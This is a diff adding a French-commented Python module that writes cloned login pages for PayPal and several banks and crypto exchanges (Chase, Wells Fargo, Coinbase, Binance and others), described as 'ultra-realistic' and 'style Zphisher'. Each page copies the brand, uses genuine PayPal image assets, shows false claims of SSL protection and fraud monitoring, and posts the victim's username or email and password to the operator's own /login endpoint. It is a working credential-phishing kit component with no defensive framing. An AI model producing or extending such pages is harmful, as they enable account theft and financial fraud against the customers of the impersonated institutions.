@@ -1,0 +1,578 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Templates Bancaires Ultra-Réalistes
+Génère des templates de banques avec un design professionnel
+"""
+
+import os
+
+class BankTemplates:
+    def __init__(self, templates_dir):
+        self.templates_dir = templates_dir
+        
+    def generate_paypal_template(self):
+        """Génère le template PayPal ultra-stylisé style Zphisher"""
+        html = """
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Connexion Sécurisée</title>
+    <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
+        body { 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0070ba 0%, #1546a0 50%, #1e3a8a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="white" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
+            pointer-events: none;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+            padding: 50px;
+            width: 100%;
+            max-width: 450px;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: slideUp 0.6s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+            animation: fadeIn 0.8s ease-out 0.2s both;
+        }
+        
+        .logo img {
+            height: 50px;
+            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.1));
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .title {
+            text-align: center;
+            color: #1a202c;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 40px;
+            animation: fadeIn 0.8s ease-out 0.4s both;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            animation: fadeIn 0.8s ease-out 0.6s both;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #4a5568;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            transition: color 0.3s ease;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
+            background: rgba(255, 255, 255, 1);
+        }
+        
+        .form-group input:hover {
+            border-color: #cbd5e0;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #0070ba 0%, #005ea6 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 0.8s ease-out 0.8s both;
+        }
+        
+        .login-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .login-btn:hover::before {
+            left: 100%;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 112, 186, 0.3);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .security-notice {
+            text-align: center;
+            margin-top: 30px;
+            color: #718096;
+            font-size: 13px;
+            animation: fadeIn 0.8s ease-out 1s both;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            color: #718096;
+            font-size: 12px;
+            animation: fadeIn 0.8s ease-out 1.2s both;
+        }
+        
+        .security-badge img {
+            width: 18px;
+            margin-right: 8px;
+            opacity: 0.7;
+        }
+        
+        .forgot-link {
+            text-align: center;
+            margin-top: 25px;
+            animation: fadeIn 0.8s ease-out 1.4s both;
+        }
+        
+        .forgot-link a {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+        
+        .forgot-link a:hover {
+            color: #005ea6;
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal">
+        </div>
+        <h1 class="title">Connexion à votre compte</h1>
+        <form method="POST" action="/login" id="loginForm">
+            <div class="form-group">
+                <label for="email">Adresse e-mail ou numéro de mobile</label>
+                <input type="email" id="email" name="email" required autocomplete="email">
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="login-btn" id="loginBtn">
+                Se connecter
+            </button>
+        </form>
+        <div class="security-notice">
+            🔒 Connexion sécurisée par cryptage SSL 256-bit
+        </div>
+        <div class="security-badge">
+            <img src="https://www.paypalobjects.com/webstatic/icon/security.png" alt="Security">
+            Protection contre la fraude et surveillance 24/7
+        </div>
+        <div class="forgot-link">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+    </div>
+    
+    <script>
+        // Animation de chargement
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('loginBtn');
+            btn.innerHTML = 'Connexion en cours...';
+            btn.style.opacity = '0.7';
+            btn.disabled = true;
+        });
+        
+        // Effet de focus amélioré
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'scale(1.02)';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+    </script>
+</body>
+</html>
+        """
+        with open(f"{self.templates_dir}/paypal.html", 'w', encoding='utf-8') as f:
+            f.write(html)
+            
+    def generate_bank_template(self, bank_name, bank_color, bank_logo_url=None):
+        """Génère un template bancaire ultra-réaliste"""
+        html = f"""
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{bank_name} - Connexion Sécurisée</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {{ 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }}
+        
+        body {{ 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, {bank_color} 0%, {bank_color}dd 50%, {bank_color}bb 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }}
+        
+        body::before {{
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="white" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
+            pointer-events: none;
+        }}
+        
+        .container {{
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+            padding: 50px;
+            width: 100%;
+            max-width: 450px;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: slideUp 0.6s ease-out;
+        }}
+        
+        @keyframes slideUp {{
+            from {{
+                opacity: 0;
+                transform: translateY(30px);
+            }}
+            to {{
+                opacity: 1;
+                transform: translateY(0);
+            }}
+        }}
+        
+        .logo {{
+            text-align: center;
+            margin-bottom: 40px;
+            animation: fadeIn 0.8s ease-out 0.2s both;
+            font-size: 32px;
+            font-weight: 700;
+            color: {bank_color};
+        }}
+        
+        @keyframes fadeIn {{
+            from {{ opacity: 0; transform: scale(0.9); }}
+            to {{ opacity: 1; transform: scale(1); }}
+        }}
+        
+        .title {{
+            text-align: center;
+            color: #1a202c;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 40px;
+            animation: fadeIn 0.8s ease-out 0.4s both;
+        }}
+        
+        .form-group {{
+            margin-bottom: 25px;
+            animation: fadeIn 0.8s ease-out 0.6s both;
+        }}
+        
+        .form-group label {{
+            display: block;
+            color: #4a5568;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            transition: color 0.3s ease;
+        }}
+        
+        .form-group input {{
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
+        }}
+        
+        .form-group input:focus {{
+            outline: none;
+            border-color: {bank_color};
+            box-shadow: 0 0 0 3px {bank_color}20;
+            background: rgba(255, 255, 255, 1);
+        }}
+        
+        .form-group input:hover {{
+            border-color: #cbd5e0;
+        }}
+        
+        .login-btn {{
+            width: 100%;
+            background: linear-gradient(135deg, {bank_color} 0%, {bank_color}dd 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 0.8s ease-out 0.8s both;
+        }}
+        
+        .login-btn::before {{
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }}
+        
+        .login-btn:hover::before {{
+            left: 100%;
+        }}
+        
+        .login-btn:hover {{
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px {bank_color}40;
+        }}
+        
+        .login-btn:active {{
+            transform: translateY(0);
+        }}
+        
+        .security-notice {{
+            text-align: center;
+            margin-top: 30px;
+            color: #718096;
+            font-size: 13px;
+            animation: fadeIn 0.8s ease-out 1s both;
+        }}
+        
+        .forgot-link {{
+            text-align: center;
+            margin-top: 25px;
+            animation: fadeIn 0.8s ease-out 1.2s both;
+        }}
+        
+        .forgot-link a {{
+            color: {bank_color};
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }}
+        
+        .forgot-link a:hover {{
+            color: {bank_color}dd;
+            text-decoration: underline;
+        }}
+        
+        @media (max-width: 480px) {{
+            .container {{
+                padding: 30px 20px;
+                margin: 10px;
+            }}
+            
+            .title {{
+                font-size: 24px;
+            }}
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">{bank_name}</div>
+        <h1 class="title">Connexion Sécurisée</h1>
+        <form method="POST" action="/login" id="loginForm">
+            <div class="form-group">
+                <label for="username">Identifiant</label>
+                <input type="text" id="username" name="username" required autocomplete="username">
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="login-btn" id="loginBtn">
+                Se connecter
+            </button>
+        </form>
+        <div class="security-notice">
+            🔒 Connexion sécurisée par cryptage SSL 256-bit
+        </div>
+        <div class="forgot-link">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+    </div>
+    
+    <script>
+        // Animation de chargement
+        document.getElementById('loginForm').addEventListener('submit', function(e) {{
+            const btn = document.getElementById('loginBtn');
+            btn.innerHTML = 'Connexion en cours...';
+            btn.style.opacity = '0.7';
+            btn.disabled = true;
+        }});
+        
+        // Effet de focus amélioré
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {{
+            input.addEventListener('focus', function() {{
+                this.parentElement.style.transform = 'scale(1.02)';
+            }});
+            
+            input.addEventListener('blur', function() {{
+                this.parentElement.style.transform = 'scale(1)';
+            }});
+        }});
+    </script>
+</body>
+</html>
+        """
+        filename = bank_name.lower().replace(' ', '').replace('&', '').replace('*', '') + '.html'
+        with open(f"{self.templates_dir}/{filename}", 'w', encoding='utf-8') as f:
+            f.write(html)
+            
+    def generate_all_bank_templates(self):
+        """Génère tous les templates bancaires"""
+        print("🏦 Génération des templates bancaires ultra-réalistes...")
+        
+        # Template PayPal spécial
+        self.generate_paypal_template()
+        print("✅ PayPal")
+        
+        # Templates bancaires
+        banks = [
+            ("Bank of America", "#0070ba"),
+            ("Chase Bank", "#117ACA"),
+            ("Wells Fargo", "#D71E28"),
+            ("Citibank", "#0066CC"),
+            ("Stripe", "#6772E5"),
+            ("Coinbase", "#0052FF"),
+            ("Binance", "#F0B90B"),
+            ("Robinhood", "#00C805"),
+            ("E*TRADE", "#00A651")
+        ]
+        
+        for bank_name, bank_color in banks:
+            self.generate_bank_template(bank_name, bank_color)
+            print(f"✅ {bank_name}")
+            
+        print(f"🏦 {len(banks) + 1} templates bancaires créés.") 
